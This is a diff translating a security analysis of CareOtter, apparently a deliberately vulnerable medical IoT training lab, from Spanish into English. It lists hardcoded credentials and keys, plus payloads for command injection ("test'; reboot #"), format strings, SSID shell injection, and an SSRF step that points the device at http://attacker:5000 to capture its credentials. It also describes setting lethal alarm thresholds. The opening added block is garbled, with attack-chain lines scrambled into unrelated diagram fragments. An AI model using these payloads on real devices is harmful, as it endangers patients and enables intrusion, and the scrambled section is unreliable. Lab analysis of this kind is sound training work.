@@ -1,13 +1,146 @@
-# CareOtter — Análisis Arquitectónico Completo
+# CareOtter — Complete Architectural Analysis
 
-> **Fecha:** 2026-05-02  
-> **Alcance:** Código fuente de todos los componentes (firmware IoT, Cloud API, Android app)  
-> **Objetivo:** Entender cómo fluyen los datos, cómo se autentican los actores y dónde residen las vulnerabilidades arquitectónicas.
+> **Date:** 2026-05-02  
+> **Scope:** Source code for all components (IoT firmware, Cloud API, Android app)  
+> **Objective:** Understand how data flows, how actors authenticate, and where the architectural vulnerabilities reside.
+    ├──► BLE scan -> discovers CareOtter_HR
+    │     ├── Reads ManufacturerData -> obtains Cloud API IP + device WiFi IP
+    │     └── Enumerates GATT services -> discovers 0xFF10 (not advertised)
+## 1. Component Overview
+    ├──► Connect GATT -> no pairing required
+```
+    ├──► Write 0xFF12: "6767" -> PIN accepted
+│                              ANDROID APP (Patient / Admin)                    │
+    ├──► Read 0xFF11 -> obtains wifi_ssid, wifi_psk, cloud_url in plaintext
+│  │LoginActivity │  │MainActivity  │  │AdminActivity │  │BleMonitorClient │  │
+    │     -> careservice executes: uci set wireless...@wifi-iface[0].ssid='...' && ...
+    │     -> VULN: shell injection if SSID/PSK contain metacharacters
+│         │                 │                  │                                │
+    │     -> ble_server.py updates cloud_url and triggers _send_registration_to_cloud()
+    │     -> POST to http://attacker:5000/admin/device/register with signature + credentials
+    │     -> VULN: SSRF - the device sends sensitive data to any URL
+      │                 │                  │
+    │     -> rm -f /etc/config/wireless && cp /rom/etc/config/wireless ...
+    │     -> No confirmation, no re-authentication
+│        CLOUD API (Docker :5002)     │     CAREOTTER DEVICE (RPi 192.168.2.1)  │
+    └──► Write 0xFF01 (CSCP v1 packet with stolen key)
+         -> Changes thresholds to lethal values (bpm_min=0, bpm_max=255, spo2_min=0)
+         -> The device accepts without validation
+│  │  ├─ DeviceService          │─────┼──►│  TCP :9999  │  │  BLE peripheral  │ │
+│  │  │   └─ IGPClient           │     │  └─────────────┘  └────────┬─────────┘ │
+│  │  ├─ VitalsService          │     │         ▲                   │           │
+│  │  │   └─ HTTP :8081 direct   │◄────┼─────────┘                   │           │
+    ├──► 0x02 AUTHENTICATE payload="OtterMobile2026"
+    │     -> authenticated = 1 (global for the ENTIRE process)
+│  │       ├─ devices (MAC)      │     │                    │  HTTP :8081      │ │
+    ├──► 0x03 GET_NETWORK -> returns the full /etc/config/wireless (with PSK)
+│  │       └─ device_config      │     │                    │  ├─ /thresholds  │ │
+    ├──► 0x05 VERIFY_STATUS payload="%x.%x.%x" -> format string leak
+│                                     │                    └──────────────────┘ │
+    ├──► 0x06 SET_WIFI payload="SSID|PSK" -> shell injection
+      ▲
+    ├──► 0x0B DEFIBRILLATE payload="%x.%x.%x" -> format string in events.log
+      │  {signature, mac, patient{}, admin{}, device_ip}
+    ├──► 0x0C EMERGENCY_ALERT payload="test'; reboot #" -> command injection -> reboot
+      └──────────────────────────────┐
+    └──► 0x0D DEAUTHENTICATE -> authenticated = 0
+                  ┌──────────▼──────────┐
+                  │   ATTACKER SERVER   │
+                  └─────────────────────┘
+```
 
----
+    ├──► POST /api/auth/login -> JWT
 
-## 1. Visión General de Componentes
+    │     -> Cloud API does: auth -> 0x03 -> deauth to the device
+    │     -> Returns WiFi config (field `raw` with PSK if VULNERABLE=1)
+### 2.1 Services Running on the Device
+    │     -> Cloud API does: auth -> 0x06 -> deauth
+| Service | Port | Protocol | Language | Start |
+    │     -> Cloud API does: auth -> 0x04 -> deauth
+    │     -> VULN: TLV underflow proxy
+| `sensor_service.py` | 8081 | HTTP/JSON (TCP) | Python 3 | `/etc/init.d/medical-sensor` |
+         -> Cloud API does: auth -> 0x09 -> deauth
 
+All listen on `0.0.0.0` (all interfaces), so they are reachable over both Ethernet (`192.168.2.1`) and WiFi (when configured).
+
+│   or Sim     │                 │  :8081           │
+
+                                          │ HTTP /vitals ( every 10s )
+
+                                   │ vitals_snapshot (frozen every 10s)
+- **`sensor_loop` thread**: reads from the I2C bus (real or simulated) every 100ms. In simulated mode it generates random values around 72 BPM / 98% SpO2.
+            │ BLE notify   │
+            │ (every 2s)   │
+
+**HTTP endpoints (:8081):**
+
+| Method | Path | Auth | Function |
+|--------|------|------|---------|
+| GET | `/vitals` | ✅ `X-API-Key` | BPM/SpO2 snapshot |
+| GET | `/health` | ❌ No | Liveness probe (returns plain `ok`) |
+| GET | `/log` | ✅ `X-API-Key` | Full in-memory vitals buffer |
+| GET | `/config` | ✅ `X-API-Key` | Service config (incl. `api_key`, `cloud_endpoint`, `cloud_token`) |
+| GET | `/alerts` | ✅ `X-API-Key` | Alert state vs current thresholds |
+| GET | `/history?minutes=N` | ✅ `X-API-Key` | Filtered history (no validation of N) |
+| POST | `/thresholds` | ✅ `X-API-Key` | Changes alert thresholds (JSON body) |
+
+**Key architectural vulnerabilities:**
+1. **Hardcoded API token + `==` comparison**: `API_KEY` is loaded from `config.json` (default `careotter-2024-lab`) and checked with a plain Python `==`, exposing a timing side-channel (CWE-208).
+2. **`/history?minutes=99999`**: there is no upper bound on the `minutes` parameter; an authenticated caller can drain the whole 1440-entry buffer in one request.
+3. **401 `hint` field leaks header name**: any probe of a protected endpoint (`/config`, `/vitals`, …) returns `{"error":"unauthorized","hint":"X-API-Key header required"}`, telling the attacker exactly which header to hunt for (CWE-200).
+4. **`/config` echoes the token after auth**: once the header is supplied, the response includes the `api_key` field verbatim — useful to confirm token rotation, useless from a defence standpoint.
+
+### 2.3 `ble_server.py` — BLE GATT Server
+
+**Role:** Exposes sensor data as a BLE peripheral called `CareOtter_HR`.
+
+**Stack:** `dbus-fast` on top of BlueZ system D-Bus. It does not use `pygatt` or `bleak` on the server side.
+
+**Published GATT services:**
+
+| UUID | Service | Characteristics | Security |
+|------|----------|-----------------|-----------|
+| `0x180D` | Heart Rate | `0x2A37` (notify) | ❌ None |
+| `0x1822` | Pulse Oximeter | `0x2A5F` (notify) | ❌ None |
+| `0x180F` | Battery | `0x2A19` (read) | ❌ None |
+| `0x180A` | Device Info | `0x2A29`, `0x2A24` (read) | ❌ None |
+| `0xFF00` | Alert Threshold | `0xFF01` (read/write/notify) | ❌ None |
+| `0xFF10` | Factory Provisioning (hidden) | `0xFF11`, `0xFF12` | ❌ None |
+
+**BLE data flow:**
+```
+sensor_service.py :8081/vitals  ──(urllib)──►  ble_server.py latest_vitals cache
+                              │
+                              ▼ (every 2s)
+                          HeartRateMeasurementChrc.update_and_notify()
+                              │
+                          _notify_characteristic() ──D-Bus──► BlueZ
+                              │
+                          PulseOximeterChrc.update_and_notify()
+                              │
+                          AlertThresholdChrc.update_and_notify()
+```
+
+**Characteristic `0xFF01` — CSCP v1 (CareOtter Secure Config Protocol):**
+- Formato de paquete de 24 bytes: `Magic(4) + CRC32(4) + AES-128-ECB(ciphertext, 16)`
+- Hardcoded key: `careotter-key-16` (identical in firmware and APK)
+- **No clinical range validation**: accepts `bpm_min=0, bpm_max=255, spo2_min=0`
+- **Design bug**: `_alert_bpm_window` is recalculated without validating that `bpm_max > bpm_min`. If `bpm_min >= bpm_max` is sent, the denominator becomes <=0 and `update_and_notify()` throws `ZeroDivisionError`, killing the BLE notification loop.
+
+**Characteristic `0xFF11` — Provisioning Config:**
+- Acepta comandos JSON sin verificar si el PIN fue validado primero (`authenticated` del `0xFF12` se ignora).
+- Available commands: `wifi_set`, `wifi_get`, `cloud_set`, `cloud_get`, `patient_set`, `admin_set`, `factory_reset`, `reboot`
+- `wifi_set` inyecta SSID/PSK directamente en `os.system()` → **shell injection**.
+- `cloud_set` accepts any URL -> **SSRF** (the device will send its signature and credentials to that URL).
+- `factory_reset` runs with a single write, without confirmation.
+- `ReadValue` devuelve `wifi_psk` en plaintext → **information disclosure**.
+
+**Characteristic `0xFF12` — Provisioning Auth:**
+- Hardcoded factory PIN: `6767`
+- There is no rate limiting or permanent lockout.
+- The PIN authentication state is **not consulted** before executing commands in `0xFF11`.
+
+**Advertising ManufacturerData (0x08D4):**
 ```
 ┌─────────────────────────────────────────────────────────────────────────────┐
 │                              ANDROID APP (Patient / Admin)                    │
@@ -52,53 +185,54 @@
 
 ---
 
-## 2. Dispositivo IoT — Firmware en la Raspberry Pi
+## 2. IoT Device — Firmware on the Raspberry Pi
 
-### 2.1 Servicios que corren en el dispositivo
+### 2.1 Services Running on the Device
 
-| Servicio | Puerto | Protocolo | Lenguaje | Inicio |
+| Service | Port | Protocol | Language | Start |
 |----------|--------|-----------|----------|--------|
 | `careservice` | 9999 | IGP v4 binario (TCP) | C | `/etc/init.d/careservice` |
 | `sensor_service.py` | 8081 | HTTP/JSON (TCP) | Python 3 | `/etc/init.d/medical-sensor` |
 | `ble_server.py` | — | BLE GATT (D-Bus) | Python 3 | `/etc/init.d/ble-server` |
 
-Todos escuchan en `0.0.0.0` (todas las interfaces), por lo que son alcanzables tanto por Ethernet (`192.168.2.1`) como por WiFi (cuando se configura).
+All listen on `0.0.0.0` (all interfaces), so they are reachable over both Ethernet (`192.168.2.1`) and WiFi (when configured).
 
-### 2.2 `sensor_service.py` — El sensor médico simulado
+### 2.2 `sensor_service.py` — The Simulated Medical Sensor
 
-**Rol:** Genera lecturas de BPM/SpO2 y las expone por HTTP.
+**Role:** Generates BPM/SpO2 readings and exposes them over HTTP.
 
 **Arquitectura interna:**
-- **Hilo `sensor_loop`**: lee del bus I2C (real o simulado) cada 100ms. En modo simulado genera valores aleatorios alrededor de 72 BPM / 98% SpO2.
-- **Hilo `snapshot_loop`**: congela una copia de `latest` cada 10s en `vitals_snapshot`. Todos los consumidores (HTTP, BLE) leen este snapshot, no el valor en tiempo real.
-- **Buffer de logs circular**: `log_buffer` mantiene hasta 1440 entradas (~24h). Las entradas son resúmenes cada 60s con promedios, mínimos y máximos.
+- **`sensor_loop` thread**: reads from the I2C bus (real or simulated) every 100ms. In simulated mode it generates random values around 72 BPM / 98% SpO2.
+- **`snapshot_loop` thread**: freezes a copy of `latest` every 10s in `vitals_snapshot`. All consumers (HTTP, BLE) read this snapshot, not the real-time value.
+- **Circular log buffer**: `log_buffer` keeps up to 1440 entries (~24h). Entries are summaries every 60s with averages, minimums, and maximums.
 
 **Endpoints HTTP (:8081):**
 
-| Método | Path | Auth | Función |
+| Method | Path | Auth | Function |
 |--------|------|------|---------|
-| GET | `/vitals` | ❌ No | BPM/SpO2 snapshot |
-| GET | `/health` | ❌ No | MAC del dispositivo + status |
-| GET | `/log` | ❌ No | Buffer completo de logs |
-| GET | `/config` | ❌ No | Info del sistema (incluye `_simulator_pid`) |
-| GET | `/alerts` | ❌ No | Estado de alertas vs umbrales actuales |
-| GET | `/history?minutes=N` | ❌ No | Historial filtrado (sin validación de N) |
-| POST | `/thresholds` | ❌ No | Cambia umbrales de alerta (JSON body) |
+| GET | `/vitals` | ✅ `X-API-Key` | BPM/SpO2 snapshot |
+| GET | `/health` | ❌ No | Sonda de liveness (devuelve `ok` en texto plano) |
+| GET | `/log` | ✅ `X-API-Key` | Buffer completo de vitales en memoria |
+| GET | `/config` | ✅ `X-API-Key` | Service configuration (includes `api_key`, `cloud_endpoint`, `cloud_token`) |
+| GET | `/alerts` | ✅ `X-API-Key` | Estado de alertas vs umbrales actuales |
+| GET | `/history?minutes=N` | ✅ `X-API-Key` | Filtered history (no validation of N) |
+| POST | `/thresholds` | ✅ `X-API-Key` | Cambia umbrales de alerta (JSON body) |
 
-**Vulnerabilidades arquitectónicas clave:**
-1. **POST `/thresholds` sin autenticación**: cualquier cliente en la red puede cambiar los umbrales clínicos.
-2. **`/history?minutes=99999`**: no hay límite en el parámetro `minutes`; devuelve todo el buffer.
-3. **`/config` expone `_simulator_pid`**: información interna del proceso.
+**Key architectural vulnerabilities:**
+1. **Hardcoded API token + `==` comparison**: `API_KEY` is loaded from `config.json` (default `careotter-2024-lab`) and checked with a plain Python `==`, exposing a timing side-channel (CWE-208).
+2. **`/history?minutes=99999`**: there is no upper bound on the `minutes` parameter; an authenticated caller can drain the whole 1440-entry buffer in one request.
+3. **401 `hint` field leaks the header name**: any probe of a protected endpoint (`/config`, `/vitals`, …) returns `{"error":"unauthorized","hint":"X-API-Key header required"}`, telling the attacker exactly which header to hunt for (CWE-200).
+4. **`/config` echoes the token after auth**: once the header is supplied, the response includes the `api_key` field verbatim — useful to confirm token rotation, useless from a defensive standpoint.
 
-### 2.3 `ble_server.py` — Servidor GATT BLE
+### 2.3 `ble_server.py` — BLE GATT Server
 
-**Rol:** Expone los datos del sensor como un periférico BLE llamado `CareOtter_HR`.
+**Role:** Exposes sensor data as a BLE peripheral called `CareOtter_HR`.
 
-**Stack:** `dbus-fast` sobre D-Bus system de BlueZ. No usa `pygatt` ni `bleak` en el lado servidor.
+**Stack:** `dbus-fast` on top of BlueZ system D-Bus. It does not use `pygatt` or `bleak` on the server side.
 
-**Servicios GATT publicados:**
+**Published GATT services:**
 
-| UUID | Servicio | Características | Seguridad |
+| UUID | Service | Characteristics | Security |
 |------|----------|-----------------|-----------|
 | `0x180D` | Heart Rate | `0x2A37` (notify) | ❌ Ninguna |
 | `0x1822` | Pulse Oximeter | `0x2A5F` (notify) | ❌ Ninguna |
@@ -107,11 +241,11 @@ Todos escuchan en `0.0.0.0` (todas las interfaces), por lo que son alcanzables t
 | `0xFF00` | Alert Threshold | `0xFF01` (read/write/notify) | ❌ Ninguna |
 | `0xFF10` | Factory Provisioning (hidden) | `0xFF11`, `0xFF12` | ❌ Ninguna |
 
-**Flujo de datos BLE:**
+**BLE data flow:**
 ```
 sensor_service.py :8081/vitals  ──(urllib)──►  ble_server.py latest_vitals cache
                                                       │
-                                                      ▼ (cada 2s)
+                                                      ▼ (every 2s)
                                               HeartRateMeasurementChrc.update_and_notify()
                                                       │
                                               _notify_characteristic() ──D-Bus──► BlueZ
@@ -121,78 +255,78 @@ sensor_service.py :8081/vitals  ──(urllib)──►  ble_server.py latest_vi
                                               AlertThresholdChrc.update_and_notify()
 ```
 
-**Característica `0xFF01` — CSCP v1 (CareOtter Secure Config Protocol):**
-- Formato de paquete de 24 bytes: `Magic(4) + CRC32(4) + AES-128-ECB(ciphertext, 16)`
-- Clave hardcodeada: `careotter-key-16` (idéntica en firmware y APK)
-- **No hay validación de rangos clínicos**: acepta `bpm_min=0, bpm_max=255, spo2_min=0`
-- **Bug de diseño**: `_alert_bpm_window` se recalcula sin validar que `bpm_max > bpm_min`. Si se envía `bpm_min >= bpm_max`, el denominador se hace ≤0 y `update_and_notify()` lanza `ZeroDivisionError`, matando el loop de notificaciones BLE.
+**Characteristic `0xFF01` — CSCP v1 (CareOtter Secure Config Protocol):**
+- 24-byte packet format: `Magic(4) + CRC32(4) + AES-128-ECB(ciphertext, 16)`
+- Hardcoded key: `careotter-key-16` (identical in firmware and APK)
+- **No clinical range validation**: accepts `bpm_min=0, bpm_max=255, spo2_min=0`
+- **Design bug**: `_alert_bpm_window` is recalculated without validating that `bpm_max > bpm_min`. If `bpm_min >= bpm_max` is sent, the denominator becomes <=0 and `update_and_notify()` throws `ZeroDivisionError`, killing the BLE notification loop.
 
-**Característica `0xFF11` — Provisioning Config:**
-- Acepta comandos JSON sin verificar si el PIN fue validado primero (`authenticated` del `0xFF12` se ignora).
-- Comandos disponibles: `wifi_set`, `wifi_get`, `cloud_set`, `cloud_get`, `patient_set`, `admin_set`, `factory_reset`, `reboot`
-- `wifi_set` inyecta SSID/PSK directamente en `os.system()` → **shell injection**.
-- `cloud_set` acepta cualquier URL → **SSRF** (el dispositivo enviará su firma y credenciales a esa URL).
-- `factory_reset` se ejecuta con un solo write, sin confirmación.
-- `ReadValue` devuelve `wifi_psk` en plaintext → **information disclosure**.
+**Characteristic `0xFF11` — Provisioning Config:**
+- Accepts JSON commands without verifying whether the PIN was validated first (`authenticated` from `0xFF12` is ignored).
+- Available commands: `wifi_set`, `wifi_get`, `cloud_set`, `cloud_get`, `patient_set`, `admin_set`, `factory_reset`, `reboot`
+- `wifi_set` injects SSID/PSK directly into `os.system()` -> **shell injection**.
+- `cloud_set` accepts any URL -> **SSRF** (the device will send its signature and credentials to that URL).
+- `factory_reset` runs with a single write, without confirmation.
+- `ReadValue` returns `wifi_psk` in plaintext -> **information disclosure**.
 
-**Característica `0xFF12` — Provisioning Auth:**
-- PIN de fábrica hardcodeado: `1234`
-- No hay rate limiting ni bloqueo permanente.
-- El estado de autenticación del PIN **no se consulta** antes de ejecutar comandos en `0xFF11`.
+**Characteristic `0xFF12` — Provisioning Auth:**
+- Hardcoded factory PIN: `6767`
+- There is no rate limiting or permanent lockout.
+- The PIN authentication state is **not consulted** before executing commands in `0xFF11`.
 
 **Advertising ManufacturerData (0x08D4):**
-- 10 bytes binarios: `[API_WiFi_IP(4)] + [API_Port(2)] + [Device_WiFi_IP(4)]`
-- Cualquier escáner BLE pasivo puede leer la IP del Cloud API y la IP WiFi del dispositivo sin emparejarse.
+- 10 binary bytes: `[API_WiFi_IP(4)] + [API_Port(2)] + [Device_WiFi_IP(4)]`
+- Any passive BLE scanner can read the Cloud API IP and the device WiFi IP without pairing.
 
-### 2.4 `careservice.c` — Servicio de administración binario (IGP v4)
+### 2.4 `careservice.c` — Binary Administration Service (IGP v4)
 
-**Rol:** Puerta de administración del dispositivo. Expone un protocolo binario propietario.
+**Role:** Administration gateway for the device. Exposes a proprietary binary protocol.
 
-**Formato del protocolo:**
+**Protocol format:**
 ```
 Header (8 bytes, big-endian):
   Magic    : 0x43415245 ("CARE")
   Cmd      : 1 byte
-  Status   : 1 byte (siempre 0x00 en request)
-  Len      : 2 bytes (longitud del payload)
+    Status   : 1 byte (always 0x00 in request)
+    Len      : 2 bytes (payload length)
 ```
 
-**Estado global crítico:**
+**Critical global state:**
 ```c
-int authenticated = 0;   // ¡Persiste entre conexiones TCP!
+int authenticated = 0;   // Persists across TCP connections!
 ```
-Este flag es **global al proceso**, no vinculado al socket. Si un cliente autentica en cualquier conexión, todos los clientes posteriores heredan el estado `authenticated=1` hasta que alguien envíe `0x0D DEAUTHENTICATE` o se reinicie el proceso.
+This flag is **global to the process**, not tied to the socket. If one client authenticates on any connection, all later clients inherit `authenticated=1` until someone sends `0x0D DEAUTHENTICATE` or the process is restarted.
 
-**Comandos IGP:**
+**IGP commands:**
 
-| Cmd | Nombre | Auth | Función | Vulnerabilidad |
+| Cmd | Name | Auth | Function | Vulnerability |
 |-----|--------|------|---------|----------------|
-| `0x01` | SYS_INFO | ❌ | Kernel y arquitectura | — |
-| `0x02` | AUTHENTICATE | ❌ | Valida `OtterMobile2026` | Hardcoded credential (CWE-798) |
-| `0x03` | GET_NETWORK | ✅ | Devuelve `/etc/config/wireless` | WiFi PSK en plaintext |
-| `0x04` | SET_PREFS | ✅ | TLV parser de preferencias | Integer underflow → BOF |
-| `0x05` | VERIFY_STATUS | ❌ | Diagnóstico de subsistema | Format string (snprintf con payload como formato) |
-| `0x06` | SET_WIFI | ✅ | Configura WiFi vía UCI | Shell injection |
-| `0x07` | GET_VITALS | ❌ | Proxea `/vitals` del sensor | — |
-| `0x08` | SET_THRESHOLD | ✅ | Umbrales clínicos vía TLV | — |
-| `0x09` | REBOOT_SERVICE | ✅ | Reinicia servicio init.d | Zombie processes (no waitpid) |
-| `0x0A` | GET_LOG | ✅ | Últimos 512 bytes de log | — |
-| `0x0B` | DEFIBRILLATE | ✅ | Simula descarga 200J | Format string en log de eventos |
-| `0x0C` | EMERGENCY_ALERT | ✅ | Envía alerta vía curl | OS command injection |
-| `0x0D` | DEAUTHENTICATE | ❌ | Resetea `authenticated=0` | — |
+| `0x01` | SYS_INFO | ❌ | Kernel and architecture | — |
+| `0x02` | AUTHENTICATE | ❌ | Validates `OtterMobile2026` | Hardcoded credential (CWE-798) |
+| `0x03` | GET_NETWORK | ✅ | Returns `/etc/config/wireless` | WiFi PSK in plaintext |
+| `0x04` | SET_PREFS | ✅ | Preferences TLV parser | Integer underflow -> BOF |
+| `0x05` | VERIFY_STATUS | ❌ | Subsystem diagnostics | Format string (snprintf with payload as format) |
+| `0x06` | SET_WIFI | ✅ | Configures WiFi via UCI | Shell injection |
+| `0x07` | GET_VITALS | ❌ | Proxies sensor `/vitals` | — |
+| `0x08` | SET_THRESHOLD | ✅ | Clinical thresholds via TLV | — |
+| `0x09` | REBOOT_SERVICE | ✅ | Restarts init.d service | Zombie processes (no waitpid) |
+| `0x0A` | GET_LOG | ✅ | Last 512 bytes of log | — |
+| `0x0B` | DEFIBRILLATE | ✅ | Simulates 200J shock | Format string in event log |
+| `0x0C` | EMERGENCY_ALERT | ✅ | Sends alert via curl | OS command injection |
+| `0x0D` | DEAUTHENTICATE | ❌ | Resets `authenticated=0` | — |
 
-**Vulnerabilidades críticas en C:**
-1. **`parse_preferences()` (0x04)**: `remaining -= 2` puede underflowar si `data_len` es inconsistente. Luego `memcpy(local_store, ..., t_len)` con `t_len > 128` → stack buffer overflow.
-2. **`get_system_status()` (0x05)**: `snprintf(report_header, 128, module_name)` usa el payload como string de formato → format string leak.
-3. **DEFIBRILLATE (0x0B)**: `snprintf(fmt_buf, sizeof(fmt_buf), (char*)payload)` → segundo sink de format string. Escribe en `/tmp/careotter_events.log`.
-4. **EMERGENCY_ALERT (0x0C)**: `snprintf(cmd, ..., "curl ... '%s'", payload)` → command injection. Ejemplo: `payload = "test'; reboot #"` reinicia el dispositivo.
-5. **REBOOT_SERVICE (0x09)**: `fork()` sin `waitpid()` → procesos zombis.
+**Critical C vulnerabilities:**
+1. **`parse_preferences()` (0x04)**: `remaining -= 2` can underflow if `data_len` is inconsistent. Then `memcpy(local_store, ..., t_len)` with `t_len > 128` -> stack buffer overflow.
+2. **`get_system_status()` (0x05)**: `snprintf(report_header, 128, module_name)` uses the payload as the format string -> format string leak.
+3. **DEFIBRILLATE (0x0B)**: `snprintf(fmt_buf, sizeof(fmt_buf), (char*)payload)` -> second format-string sink. Writes to `/tmp/careotter_events.log`.
+4. **EMERGENCY_ALERT (0x0C)**: `snprintf(cmd, ..., "curl ... '%s'", payload)` -> command injection. Example: `payload = "test'; reboot #"` reboots the device.
+5. **REBOOT_SERVICE (0x09)**: `fork()` without `waitpid()` -> zombie processes.
 
 ---
 
 ## 3. Cloud API — Flask (Docker :5002)
 
-### 3.1 Arquitectura interna
+### 3.1 Internal Architecture
 
 ```
 HTTP Client
@@ -209,66 +343,70 @@ Flask app.py ──┬──► @token_required (decoradores.py)
                └──► DatabaseService ──► SQLite (/app/data/careotter.db)
 ```
 
-### 3.2 Autenticación en la Cloud API
+### 3.2 Authentication in the Cloud API
 
-**Flujo de login:**
+**Login flow:**
 ```
 POST /api/auth/login
 Body: {"username": "admin", "password": "CareOtter2026!"}
 
-1. DatabaseService.verify_user() → SHA-256(password) == password_hash
-2. JWTService.generate_token() → JWT HS256 firmado con 'careotter_jwt_2026'
-3. Respuesta: {"token": "eyJ...", "role": "admin", ...}
+1. DatabaseService.verify_user() -> SHA-256(password) == password_hash
+2. JWTService.generate_token() -> JWT HS256 signed with 'careotter_jwt_2026'
+3. Response: {"token": "eyJ...", "role": "admin", ...}
 ```
 
-**Problemas:**
-- **SHA-256 sin sal**: `hashlib.sha256(password.encode()).hexdigest()`. Rainbow tables funcionan directamente.
-- **JWT secreto débil**: `'careotter_jwt_2026'` es corto y predecible. `jwt_tool` o `hashcat` lo rompen en segundos.
-- **Mensajes de error diferenciados**: el decorador `@token_required` distingue "Token expirado" vs "Firma inválida" vs "Token malformado", facilitando ataques de fuerza bruta contra la firma.
+**Issues:**
+- **Unsalted SHA-256**: `hashlib.sha256(password.encode()).hexdigest()`. Rainbow tables work directly.
+- **Weak JWT secret**: `'careotter_jwt_2026'` is short and predictable. `jwt_tool` or `hashcat` crack it in seconds.
+- **Distinct error messages**: the `@token_required` decorator distinguishes "Token expired" vs "Invalid signature" vs "Malformed token", making brute-force attacks against the signature easier.
 
 **Roles:**
-- `admin`: acceso a `/admin/*`, `/api/devices`, `/api/network`, etc.
-- `patient`: acceso a `/patient/*`, `/api/devices/me`, `/api/vitals`
+- `admin`: access to `/admin/*`, `/api/devices`, `/api/network`, etc.
+- `patient`: access to `/patient/*`, `/api/devices/me`, `/api/vitals`
 
-**Fallo de autorización (API-06):** El endpoint `/api/devices` (GET lista todos los dispositivos) requiere `@token_required` pero **no verifica el rol**. Un paciente autenticado puede obtener la lista completa.
+**Authorization failure (API-06):** The `/api/devices` endpoint (GET lists all devices) requires `@token_required` but **does not verify the role**. An authenticated patient can obtain the full list.
 
 ### 3.3 Endpoints clave
 
 | Endpoint | Auth | IGP Cmd | Vuln |
 |----------|------|---------|------|
 | `/api/device/status?module=X` | ❌ No | `0x05` | Format string proxy (X=%x.%x.%x) |
-| `/api/network` | ✅ JWT | `0x03` | Devuelve campo `raw` con PSK en vuln=1 |
+| `/api/network` | ✅ JWT | `0x03` | Returns `raw` field with PSK when vuln=1 |
 | `/api/config/preferences` | ✅ JWT | `0x04` | TLV underflow proxy |
-| `/api/services/restart` | ✅ JWT | `0x09` | Reinicio de servicios |
-| `/api/vitals` | ❌ No | — | Cache compartida (lecturas idénticas para todos) |
-| `/hint` | ❌ No | — | Info disclosure (guía hacia BLE provisioning) |
-| `/admin/device/register` | ❌ No | — | Registro por firma hardcodeada |
-| `/initialize_iot` | ❌ No | — | Fallback que crea usuarios por defecto |
+| `/api/services/restart` | ✅ JWT | `0x09` | Service restart |
+| `/api/vitals` | ❌ No | — | Shared cache (identical readings for everyone) |
+| `/hint` | ❌ No | — | Information disclosure (guides toward BLE provisioning) |
+| `/admin/device/register` | ❌ No | — | Registration by hardcoded signature |
+| `/initialize_iot` | ❌ No | — | **Out of scope** — playability fallback that creates default users. Not part of attack chains. |
 
-**Modo `VULNERABLE` (env var):**
-- `VULNERABLE=1`: `debug=True` en Flask → **Werkzeug debugger expuesto** (RCE potencial si se adivina el PIN).
-- `VULNERABLE=1`: errores 500 devuelven `type(e).__name__` y `str(e)`.
-- `VULNERABLE=0`: oculta campos `raw`, fuerza módulo `CareOtter`, desactiva debug.
+**`VULNERABLE` mode (env var):**
+- `VULNERABLE=1`: `debug=True` in Flask -> **Werkzeug debugger exposed** (potential RCE if the PIN is guessed).
+- `VULNERABLE=1`: 500 errors return `type(e).__name__` and `str(e)`.
+- `VULNERABLE=0`: hides `raw` fields, forces `CareOtter` module, disables debug.
 
-### 3.4 Registro dinámico del dispositivo
+### 3.4 Dynamic Device Registration
 
-**Flujo normal (Chain F):**
+**Normal flow (Chain F):**
 ```
-1. Attacker descubre BLE hidden service 0xFF10
-2. Escribe PIN 1234 en 0xFF12 → authenticated=true
-3. Escribe {"cmd":"cloud_set","url":"http://attacker:5000"} en 0xFF11
-4. ble_server.py llama _send_registration_to_cloud()
+1. Attacker discovers BLE hidden service 0xFF10
+2. Writes PIN 6767 to 0xFF12 -> authenticated=true
+3. Writes {"cmd":"cloud_set","url":"http://attacker:5000"} to 0xFF11
+4. ble_server.py calls _send_registration_to_cloud()
 5. POST http://attacker:5000/admin/device/register
    Body: {"signature":"CareOtterFactorySig2026", "mac":"AA:BB:...", 
           "patient":{...}, "admin":{...}, "device_ip":"..."}
-6. Attacker captura la firma y las credenciales
-7. Replay al Cloud API real: POST http://192.168.2.2:5002/admin/device/register
+6. Attacker captures the signature and credentials
+7. Replay to the real Cloud API: POST http://192.168.2.2:5002/admin/device/register
 ```
 
-**Fallback (`/initialize_iot`):**
-- Si la base de datos está vacía (0 usuarios), cualquiera puede llamar `POST /initialize_iot`
-- Crea: `admin/CareOtter2026!` + `patient/patient123`
-- Registra dispositivo dummy `AA:BB:CC:DD:EE:FF`
+**Fallback (`/initialize_iot`) — Out of Scope:**
+> This is a **lab playability fallback**, not an attack surface. It represents Phase 2 (post-provisioning operational mode) and is excluded from the CareOtter attack playbook and vulnerability checklist.
+
+- If the database is empty (0 users), anyone can call `GET /initialize_iot`
+- Creates: `admin/CareOtter2026!` + `patient/patient123`
+- Registers dummy device `AA:BB:CC:DD:EE:FF`
+
+See `CareOtter.md` → *Lab Scope and Phases* for the formal boundary definition.
 
 ### 3.5 Collector de vitales (background thread)
 
@@ -280,43 +418,43 @@ def _vitals_collector():
         result = vitals.get_current()   # HTTP GET /vitals
         if result['success']:
             db.store_vitals(data, device_mac=DEVICE_MAC)
-            sleep_until(next_snapshot_boundary)  # alinea con snapshot del sensor
+            sleep_until(next_snapshot_boundary)  # aligns with the sensor snapshot
 ```
 
-- Corre como `daemon=True` dentro del mismo proceso Flask.
-- Si `DEVICE_IP` cambia (después de `/admin/device/register`), el collector automáticamente empieza a sondear la nueva IP WiFi en lugar de Ethernet.
+- Runs as `daemon=True` inside the same Flask process.
+- If `DEVICE_IP` changes (after `/admin/device/register`), the collector automatically starts polling the new WiFi IP instead of Ethernet.
 
 ---
 
-## 4. Aplicación Android — `vulnzoo_apps/careotter_app`
+## 4. Android Application — `vulnzoo_apps/careotter_app`
 
-### 4.1 Componentes Java
+### 4.1 Java Components
 
-| Clase | Rol | Canal |
+| Class | Role | Channel |
 |-------|-----|-------|
-| `LoginActivity` | Auth contra Cloud API | HTTP plain :5002 |
-| `MainActivity` | Monitor BLE del paciente | BLE GATT |
-| `AdminActivity` | Panel admin vía IGP v4 | TCP plain :9999 |
-| `BleMonitorClient` | Wrapper Android BLE | BLE GATT |
-| `IgpClient` | Cliente IGP v4 binario | TCP plain :9999 |
+| `LoginActivity` | Auth against Cloud API | Plain HTTP :5002 |
+| `MainActivity` | Patient BLE monitor | BLE GATT |
+| `AdminActivity` | Admin panel via IGP v4 | Plain TCP :9999 |
+| `BleMonitorClient` | Android BLE wrapper | BLE GATT |
+| `IgpClient` | Binary IGP v4 client | Plain TCP :9999 |
 | `CareOtterConfig` | CSCP v1 packet builder | — |
-| `VitalsLogger` | Log a /sdcard | Filesystem |
